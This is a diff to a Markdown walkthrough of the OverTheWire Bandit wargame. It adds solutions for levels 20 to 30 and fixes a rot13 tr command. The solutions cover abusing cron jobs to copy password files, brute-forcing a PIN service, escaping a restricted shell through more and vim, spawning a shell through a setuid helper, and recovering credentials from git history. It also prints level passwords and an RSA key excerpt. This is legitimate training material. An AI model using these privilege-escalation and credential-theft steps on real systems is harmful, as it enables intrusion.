@@ -277,7 +277,7 @@ The easy way to solve this problem is to just copy and paste the ciphertext into
 
 In a rot13 cipher, the alphabet is split in half due to the fact that the alphabet is 26 characters in length. A becomes N, B becomes O, C becomes P, and so on and so forth. We can think of this as one set of characters becoming two sets of characters, so `[A-Z]` becomes `[A-M]` and `[N-Z]`. Then to apply the rotation to each character, we can use the fact that the alphabet evenly divides into two, 13-character halves and just swap the halves `[A-M]` and `[N-Z]` to become `[N-Z]` and `[A-M]` while keeping the original set of characters `[A-Z]` original. In other words, we are *translating* all `[A-Z]` to become `[N-Z]` and `[A-M]` in that order. We can do this using the `tr` tool. However, we also need to remember to do this for the lowercase counterparts of these characters, so we will include an additional set `[a-z]` that becomes `[n-z]` and `[a-m]` in that order.
 
-When using `tr`, we can simply just group and join each set together, so all "to be translated" sets can be expressed as just `[A-Za-z]` and all "to translate into" sets can be expressed as just `[N-ZM-Zn-zm-z]`. In addition, we will once again use the feed operator `<` to feed the contents of `data.txt` as an input to the `tr` utility.
+When using `tr`, we can simply just group and join each set together, so all "to be translated" sets can be expressed as just `[A-Za-z]` and all "to translate into" sets can be expressed as just `[N-ZA-Mn-za-m]`. In addition, we will once again use the feed operator `<` to feed the contents of `data.txt` as an input to the `tr` utility.
 
 ```
 bandit11@bandit:~$ tr '[A-Za-z]' '[N-ZA-Mn-za-m]' < data.txt 
@@ -480,7 +480,7 @@ BfMYroe26WYalil77FoDi9qh59eK5xNr
 
 This level is similar, except now the service is located on port 30001 and is using SSL encryption. SSL (secure sockets layer) is a security standard that will require us to use some sort of SSL client now instead of `nc` like we did before.
 
-We can use `openssl` for this. After reading the manual pages for `openssl`, it becomes apparent that we need to use `s_client` in order to create a generic SSL/TLS connection to a remote host also using SSL/TLS. The manual page for `s_client` specify that we can connect to a remote host using `-connect host:port`. We will also use `-ign_eof` to ignore the EOF (end of file) to prevent getting messages such as "HEARTBEATING" and "Read R BLOCK" that are related to the protocol.
+We can use `openssl` for this. After reading the manual pages for `openssl`, it becomes apparent that we need to use `s_client` in order to create a generic SSL/TLS connection to a remote host also using SSL/TLS. The manual page for `s_client` specifies that we can connect to a remote host using `-connect host:port`. We will also use `-ign_eof` to ignore the EOF (end of file) to prevent getting messages such as "HEARTBEATING" and "Read R BLOCK" that are related to the protocol.
 
 ```
 bandit15@bandit:~$ openssl s_client -connect 127.0.0.1:30001 -ign_eof < /etc/bandit_pass/bandit15
@@ -593,11 +593,10 @@ vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
 closed
 ```
 
-Here, we're given an SSH key instead of a password again. Fair enough. We can use regular expressions in `grep` and give it an arbitrary overshot of the amount of lines to include after an initial match using `-A` (after), and then adjust accordingly.
+Here, we're given an SSH key instead of a password. Fair enough. We can use regular expressions in `grep` and give it an arbitrary overshot of the amount of lines to include after an initial match using `-A` (after), and then adjust accordingly.
 
 ```
 bandit16@bandit:~$ cd $(mktemp -d)
-bandit16@bandit:/tmp/tmp.x8HkE0JRxX$
 bandit16@bandit:/tmp/tmp.x8HkE0JRxX$ openssl s_client -connect 127.0.0.1:31790 -ign_eof < /etc/bandit_pass/bandit16 2>/dev/null | grep "BEGIN RSA" -A 30
 -----BEGIN RSA PRIVATE KEY-----
 MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
@@ -706,3 +705,418 @@ GbKksEFF4yrVs6il55v6gwY5aVje5f0j
 ```
 
 ## Level 20 -> 21
+
+For this level, there's a SUID binary once again. However, it works a bit differently than the binary from the previous level.
+
+```
+bandit20@bandit:~$ ls
+suconnect
+bandit20@bandit:~$ ./suconnect 
+Usage: ./suconnect <portnumber>
+This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back.
+```
+
+This program will firstly connect to a specific port on the localhost, and then it will receive some sort of data. If the data is the `bandit20` password, then it will transmit the `bandit21` password back.
+
+Here, we need two sessions: one to run `suconnect`, and one to be listening for connections with `nc`. We can do this be using `screen`. You can read about `screen` usage by consulting its `man` page if you don't know how to split screens, jump terminals, or start new shells.
+
+On one of our terminals, we will listen for connections on an arbitrary port using `nc` with the `-l -p` (listen, port) flags and giving a valid port as an argument. Additionally, we want to transmit to all connections the password for `bandit20`, which we can do using the `<` feed operator.
+
+```
+bandit20@bandit:~$ nc -l -p 6767 < /etc/bandit_pass/bandit20
+```
+
+On our other terminal, we will run `suconnect` and connect to the port that `nc` is listening to on the other terminal.
+
+```
+bandit20@bandit:~$ ./suconnect 6767
+Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+Password matches, sending next password
+```
+
+On our terminal with `nc`, we get the password to the next level.
+
+```
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+```
+
+## Level 21 -> 22
+
+This is the first level where we'll be exploring `cron` (chronological), which is used to schedule periodic jobs on Linux systems. We can list all cron jobs by viewing `/etc/cron.d/`.
+
+```
+bandit21@bandit:~$ ls /etc/cron.d/
+cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root
+```
+
+Based on the names, I have a feeling that `cronjob_bandit22` is the job we're looking for. Let's go ahead and read it and see what it says.
+
+```
+bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+```
+
+It looks like this job is running `/usr/bin/cronjob_bandit22.sh` periodically. Let's go ahead and view that script's code.
+
+```
+bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh 
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+```
+
+It looks like this script creates a temporary file and then reads the password for the user `bandit22` into the created temporary file. As such, all we have to do is read the file that the password is being written to.
+
+```
+bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+```
+
+Just as a sidenote, most systems are shifting away from cron in favor of systemd timers, a change that is controversial but that many modern hackers such as myself readily welcome (hot take).
+
+## Level 22 -> 23
+
+This level starts out similar to the previous one. There's a cron job that's being run periodically. Let's find it, see what script its running, and then read the code in the script.
+
+```
+bandit22@bandit:~$ ls /etc/cron.d/
+cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root
+bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+```
+
+Based on the cron job, we could see that this is being run as the user `bandit23`. As such, the `myname` variable inside of the shell script is equal to `bandit23`. Therefore, `mytarget` seems to be the MD5 hash generated from the string echoed in the script. We can simply just run this code in our terminal to see the output.
+
+```
+bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+8ca319486bfbbc3663ea0fbe81326349
+```
+
+Now we know where the `bandit23` password is being written to. We can just `cat` it from here.
+
+```
+bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+```
+
+## Level 23 -> 24
+
+This is yet another level dealing with cron. Let's start the same way we started the previous two.
+
+```
+bandit23@bandit:~$ ls /etc/cron.d/
+cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root
+bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+```
+
+Here, we are dealing with a much more complex script. However, all that we need to know about it is very simply clarified in the string: "Executing and deleting all scripts in `/var/spool/$myname`". Because this cron job is being run as the user `bandit24`, this means that it is executing and then deleting all scripts in `/var/spool/bandit24/`.
+
+We're going to make a very simple script that writes the contents of `/etc/bandit_pass/bandit24` to a arbitrarily named file in `/tmp`, from which we can then read and get the contents.
+
+```
+bandit23@bandit:~$ vim /var/spool/bandit24/s.kat.sh; chmod +x /var/spool/bandit24/s.kat.sh
+```
+
+In case you're wondering what `chmod +x` does, it makes our script executable (change mode, add execution).
+
+```sh
+#!/bin/bash      
+
+mkdir /tmp/s.kat./
+cat /etc/bandit_pass/bandit24 > /tmp/s.kat./password
+```
+
+Now we just wait a bit for the system to get around to executing our script when it performs the cron job. After waiting for a bit, we can `cat` the password.
+
+```
+bandit23@bandit:~$ cat /tmp/s.kat./password
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
+
+## Level 24 -> 25
+
+In this level, we're brute forcing a 4-digit PIN checker listening on port 30002. If we enter the correct PIN, then the service will give us the password for `bandit25`. Let's give a random PIN to see what happens when we give it the wrong answer.
+
+```
+bandit24@bandit:~$ echo 1000 | nc 127.0.0.1 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Fail! You did not supply enough data. Try again.
+```
+
+Now that we know a little bit more about the program, let's try doing it again with that error message in mind.
+
+```
+bandit24@bandit:~$ bandit24=$(cat /etc/bandit_pass/bandit24); echo $bandit24 1000 | nc 127.0.0.1 30002
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+Wrong! Please enter the correct pincode. Try again.
+```
+
+Now that we know how to send a PIN, let's create a script that will attempt every single possible 4-digit PIN and write the data to a log file. We'll make a script in a temporary directory.
+
+```
+bandit24@bandit:~$ cd $(mktemp -d)
+bandit24@bandit:/tmp/tmp.A0szn8VVAZ$ touch script.sh; chmod +x script.sh
+bandit24@bandit:/tmp/tmp.A0szn8VVAZ$ vim script.sh
+```
+
+One useful feature of Bash (and most POSIX shells) is that we can use for loops in conjunction with a range such as `{0000..9999}` to create a wordlist that we can bruteforce with.
+
+```sh
+#!/bin/bash
+
+# This part creates a wordlist.
+bandit24=$(cat /etc/bandit_pass/bandit24)
+for pin in {0000..9999}; do
+    echo "$bandit24 $pin" >> wordlist
+done
+
+# This part bruteforces the service with the wordlist and logs it.
+cat wordlist | nc 127.0.0.1 30002 > bruteforce.log
+```
+
+Afterwards, we run the script and read the logs.
+
+```
+bandit24@bandit:/tmp/tmp.A0szn8VVAZ$ ./script.sh
+bandit24@bandit:/tmp/tmp.A0szn8VVAZ$ cat bruteforce.log
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+Wrong! Please enter the correct pincode. Try again.
+-- snipped, a bunch more of these --
+Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+Exiting.
+```
+
+## Level 25 -> 26
+
+We're given the SSH key for `bandit26` but we're dropped inside of a limited shell. We need to somehow break outside of this shell jail. First, let's connect to `bandit26`.
+
+```
+bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@127.0.0.1
+```
+
+Upon logging into `bandit26`, we're immediately logged out. Let's see what kind of shell it's running by having a look at `/etc/passwd` which lists user shells in addition to a bunch of other info. We'll filter out all other users using `grep`.
+
+```
+bandit25@bandit:~$ grep "bandit26" /etc/passwd
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+```
+
+It looks like `bandit26` is using a special shell: `/usr/bin/showtext`. Let's have a look at what that does.
+
+```
+bandit25@bandit:~$ cat /usr/bin/showtext
+#!/bin/sh
+
+export TERM=linux
+
+more ~/text.txt
+exit 0
+```
+
+It looks like this shell just reads `~/text.txt` using `more` and then exits. This is a very genius and not-so-obvious hack right here. The `more` utility prints information out in a pager format if there isn't enough room for all of the information to be printed right off the bat. If we were to literally shrink the size of our terminal, then `more` will page the `~/text.txt`. From here, we can gain code execution through the very limited capabilities of the `more` utility, which while limited, are enough to gain an initial foothold and spawn a traditional shell.
+
+That said, literally *shrink your terminal* and activate the pager. From here, we can hit `v` while in the pager to pivot to a text editor such as `vim`, and from within it, we can finally pop a shell by changing the `shell` variable.
+
+```
+:set shell=/bin/bash
+:shell
+bandit26@bandit:~$
+```
+
+And just like that, we now have a shell!
+
+## Level 26 -> 27
+
+This looks like another repeat of a level we did earlier where we were given a binary program that executes commands as another user. We will use the program to spawn a shell as the user and then we can proceed from there. Again, this is a repeat of an earlier level.
+
+```
+bandit26@bandit:~$ ./bandit27-do 
+Run a command as another user.
+  Example: ./bandit27-do id
+bandit26@bandit:~$ ./bandit27-do /bin/sh
+$ whoami
+bandit27
+$ cat /etc/bandit_pass/bandit27
+3ba3118a22e93127a4ed485be72ef5ea
+```
+
+## Level 27 -> 28
+
+It looks like we're going to start interacting with git! Let's go ahead and clone the repository located at `ssh://bandit27-git@localhost/home/bandit27-git/repo` with the `git` utility. Remember that the git password is the same as the user password.
+
+```
+bandit27@bandit:/tmp/tmp.2Jr4dMwzol$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+```
+
+Let's get the password from the repository now.
+
+```
+bandit27@bandit:/tmp/tmp.2Jr4dMwzol$ ls
+repo
+bandit27@bandit:/tmp/tmp.2Jr4dMwzol$ cd repo/
+bandit27@bandit:/tmp/tmp.2Jr4dMwzol/repo$ ls
+README
+bandit27@bandit:/tmp/tmp.2Jr4dMwzol/repo$ cat README 
+The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2
+```
+
+## Level 28 -> 29
+
+This level starts off similar to the previous one. Let's go ahead and clone a repository and start looking for the password.
+
+```
+bandit28@bandit:~$ cd $(mktemp -d)
+bandit28@bandit:/tmp/tmp.TpUOfpJ7dN$ git clone ssh://bandit28-git@localhost/home/bandit28-git/repo
+bandit28@bandit:/tmp/tmp.TpUOfpJ7dN$ cd repo/
+bandit28@bandit:/tmp/tmp.TpUOfpJ7dN/repo$ ls
+README.md
+bandit28@bandit:/tmp/tmp.TpUOfpJ7dN/repo$ cat README.md 
+# Bandit Notes
+Some notes for level29 of bandit.
+
+## credentials
+
+- username: bandit29
+- password: xxxxxxxxxx
+
+```
+
+Hmm, let's see if there's anything in the git logs.
+
+```
+bandit28@bandit:/tmp/tmp.TpUOfpJ7dN/repo$ git log
+commit edd935d60906b33f0619605abd1689808ccdd5ee
+Author: Morla Porla <morla@overthewire.org>
+Date:   Thu May 7 20:14:49 2020 +0200
+
+    fix info leak
+
+commit c086d11a00c0648d095d04c089786efef5e01264
+Author: Morla Porla <morla@overthewire.org>
+Date:   Thu May 7 20:14:49 2020 +0200
+
+    add missing data
+
+commit de2ebe2d5fd1598cd547f4d56247e053be3fdc38
+Author: Ben Dover <noone@overthewire.org>
+Date:   Thu May 7 20:14:49 2020 +0200
+
+    initial commit of README.md
+```
+
+It looks like there was an info leak that got fixed. We can explore what the repository looked like before the fix by checking it out at that point in time, appropriately using `git checkout` and supplying the appropriate commit.
+
+```
+bandit28@bandit:/tmp/tmp.TpUOfpJ7dN/repo$ git checkout c086d11a00c0648d095d04c089786efef5e01264
+Note: checking out 'c086d11a00c0648d095d04c089786efef5e01264'.
+
+You are in 'detached HEAD' state. You can look around, make experimental
+changes and commit them, and you can discard any commits you make in this
+state without impacting any branches by performing another checkout.
+
+If you want to create a new branch to retain commits you create, you may
+do so (now or later) by using -b with the checkout command again. Example:
+
+  git checkout -b <new-branch-name>
+
+HEAD is now at c086d11... add missing data
+bandit28@bandit:/tmp/tmp.TpUOfpJ7dN/repo$ ls
+README.md
+bandit28@bandit:/tmp/tmp.TpUOfpJ7dN/repo$ cat README.md 
+# Bandit Notes
+Some notes for level29 of bandit.
+
+## credentials
+
+- username: bandit29
+- password: bbc96594b4e001778eee9975372716b2
+
+```
+
+## Level 29 -> 30
+
+This is yet another git challenge.
+
+```
+bandit29@bandit:~$ cd $(mktemp -d)
+bandit29@bandit:/tmp/tmp.Rw9s90lO0p$ git clone ssh://bandit29-git@localhost/home/bandit29-git/repo
+bandit29@bandit:/tmp/tmp.Rw9s90lO0p$ cd repo/
+bandit29@bandit:/tmp/tmp.Rw9s90lO0p/repo$ ls
+README.md
+bandit29@bandit:/tmp/tmp.Rw9s90lO0p/repo$ cat README.md 
+# Bandit Notes
+Some notes for bandit30 of bandit.
+
+## credentials
+
+- username: bandit30
+- password: <no passwords in production!>
+
+```
+
+It says that there are no passwords in production, but what about other branches? Let's see if there are any other branches that we might be interested in. We can list all branches using `git branch -a` (a as in all).
+
+```
+bandit29@bandit:/tmp/tmp.Rw9s90lO0p/repo$ git branch -a
+* master
+  remotes/origin/HEAD -> origin/master
+  remotes/origin/dev
+  remotes/origin/master
+  remotes/origin/sploits-dev
+```
+
+Let's check out the development branch.
+
+```
+bandit29@bandit:/tmp/tmp.Rw9s90lO0p/repo$ git checkout dev
+Branch dev set up to track remote branch dev from origin.
+Switched to a new branch 'dev'
+bandit29@bandit:/tmp/tmp.Rw9s90lO0p/repo$ cat README.md 
+# Bandit Notes
+Some notes for bandit30 of bandit.
+
+## credentials
+
+- username: bandit30
+- password: 5b90576bedb2cc04c86a9e924ce42faf
+
+```
